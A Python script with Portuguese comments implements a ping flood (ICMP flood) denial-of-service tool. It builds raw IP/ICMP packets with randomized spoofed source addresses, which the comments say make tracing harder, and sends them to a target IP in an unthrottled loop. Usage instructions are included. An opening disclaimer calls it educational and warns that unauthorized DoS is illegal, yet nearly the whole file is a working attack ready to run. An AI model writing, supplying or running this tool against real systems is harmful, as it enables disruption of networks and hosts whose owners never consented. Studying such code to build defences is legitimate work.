#!/usr/bin/env python3

"""
Exemplo de Ping Flood (ICMP Flood) - Apenas para Fins Educacionais

AVISO IMPORTANTE:
Este script é fornecido estritamente para fins educacionais e de demonstração
em ambientes controlados e com permissão explícita.
NÃO o utilize contra sistemas ou redes sem autorização.
A execução não autorizada de ataques DoS/DDoS é ILEGAL e pode resultar
em severas consequências legais e financeiras.
O autor e fornecedor deste script não se responsabilizam por qualquer uso
indevido ou ilegal.

Descrição:
Este script envia um grande volume de pacotes ICMP Echo Request (ping)
para um endereço IP alvo, tentando sobrecarregar a rede ou o host alvo.
Utiliza sockets raw para construir e enviar os pacotes ICMP.

Dependências:
- Python 3
- Permissões de root/administrador (necessário para sockets raw)

Como usar (em ambiente controlado e autorizado):
1. Salve este código como 'ping_flood_example.py'.
2. Execute com privilégios de root: sudo python3 ping_flood_example.py <ip_alvo>
   Substitua <ip_alvo> pelo endereço IP do sistema que você tem permissão
   para testar (ex: uma máquina virtual em sua rede local).
"""

import socket
import struct
import time
import sys
import random
import os

# Função para calcular o checksum (necessário para cabeçalhos IP e ICMP)
def checksum(msg):
    s = 0
    # Loop de 2 em 2 bytes
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i+1]
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    # Complemento de 1
    s = ~s & 0xffff
    return s

# Função principal
def main(target_ip):
    print(f"[*] Iniciando Ping Flood para {target_ip}...")
    print("[*] Pressione Ctrl+C para parar.")

    # Verifica permissões de root
    if os.geteuid() != 0:
        print("[!] Erro: Este script precisa ser executado como root para usar sockets raw.")
        sys.exit(1)

    try:
        # Cria um socket raw para ICMP
        # AF_INET para IPv4, SOCK_RAW para socket raw, IPPROTO_ICMP para protocolo ICMP
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Permite reutilizar o endereço local rapidamente
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Permite enviar pacotes para endereços de broadcast (não usado aqui, mas boa prática)
        # s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # Informa ao kernel que o cabeçalho IP será fornecido pelo programa
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    except socket.error as e:
        print(f"[!] Erro ao criar socket: {e}")
        sys.exit(1)

    packet_count = 0
    try:
        while True:
            # --- Construção do Cabeçalho IP --- (20 bytes)
            ip_ihl = 5          # Internet Header Length (5 words = 20 bytes)
            ip_ver = 4          # Version (IPv4)
            ip_tos = 0          # Type of Service
            ip_tot_len = 0      # Total Length (será calculado depois)
            ip_id = random.randint(10000, 65535) # ID do pacote
            ip_frag_off = 0     # Fragment Offset
            ip_ttl = 255        # Time To Live
            ip_proto = socket.IPPROTO_ICMP # Protocolo (ICMP)
            ip_check = 0        # Checksum (será calculado depois)
            # IP de origem Spoofado (aleatório para dificultar rastreio - requer root)
            # CUIDADO: Spoofing pode ser ilegal e detectado por filtros de egresso
            # Use o IP real se não tiver certeza: source_ip = socket.gethostbyname(socket.gethostname())
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            dest_ip = target_ip # IP do alvo

            ip_saddr = socket.inet_aton(source_ip) # Converte IP de origem para binário
            ip_daddr = socket.inet_aton(dest_ip)   # Converte IP de destino para binário

            ip_ihl_ver = (ip_ver << 4) + ip_ihl # Combina versão e IHL

            # Empacota o cabeçalho IP sem o checksum
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

            # --- Construção do Cabeçalho ICMP Echo Request --- (8 bytes + dados)
            icmp_type = 8       # Tipo 8 = Echo Request
            icmp_code = 0       # Código 0 para Echo Request
            icmp_check = 0      # Checksum (será calculado depois)
            icmp_id = random.randint(1, 65535) # ID ICMP
            icmp_seq = packet_count # Número de sequência

            # Dados (payload) - pode ser qualquer coisa
            payload_size = random.randint(32, 1024) # Tamanho aleatório do payload
            icmp_data = bytes(random.getrandbits(8) for _ in range(payload_size))

            # Empacota o cabeçalho ICMP sem o checksum
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)

            # Calcula o checksum ICMP
            temp_icmp_packet = icmp_header + icmp_data
            icmp_check = checksum(temp_icmp_packet)

            # Empacota o cabeçalho ICMP final com o checksum correto
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)

            # --- Montagem do Pacote Completo --- (Cabeçalho IP + Cabeçalho ICMP + Dados)
            packet = ip_header + icmp_header + icmp_data

            # Calcula o comprimento total e o checksum do IP agora que temos o pacote completo
            ip_tot_len = len(packet)
            # Recria o cabeçalho IP com o comprimento correto (checksum ainda 0)
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, socket.htons(0), # Checksum zerado para cálculo
                                ip_saddr, ip_daddr)
            # Calcula o checksum do IP
            ip_check = checksum(ip_header) # Checksum apenas do cabeçalho IP

            # Recria o cabeçalho IP final com o checksum correto
            ip_header = struct.pack('!BBHHHBBH4s4s' ,
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

            # Monta o pacote final
            packet = ip_header + icmp_header + icmp_data

            # Envia o pacote para o alvo
            try:
                s.sendto(packet, (dest_ip, 0)) # Porta 0 é ignorada para sockets raw IP
                packet_count += 1
                # Imprime status a cada 100 pacotes para não poluir a saída
                if packet_count % 100 == 0:
                    print(f"[*] Pacotes enviados: {packet_count}", end='\r')
                # Pequena pausa para não sobrecarregar a CPU local instantaneamente
                # Ajuste conforme necessário para aumentar/diminuir a taxa
                # time.sleep(0.001)
            except socket.error as send_err:
                print(f"\n[!] Erro ao enviar pacote: {send_err}")
                # Pode ocorrer se a interface de rede for desativada, etc.
                time.sleep(1) # Pausa antes de tentar novamente
            except Exception as general_err:
                print(f"\n[!] Erro inesperado: {general_err}")
                break

    except KeyboardInterrupt:
        print(f"\n[*] Ataque interrompido pelo usuário. Total de pacotes enviados: {packet_count}")
    finally:
        # Fecha o socket ao terminar
        if 's' in locals() and s:
            s.close()
            print("[*] Socket fechado.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 ping_flood_example.py <ip_alvo>")
        sys.exit(1)
    target_ip_address = sys.argv[1]
    main(target_ip_address)

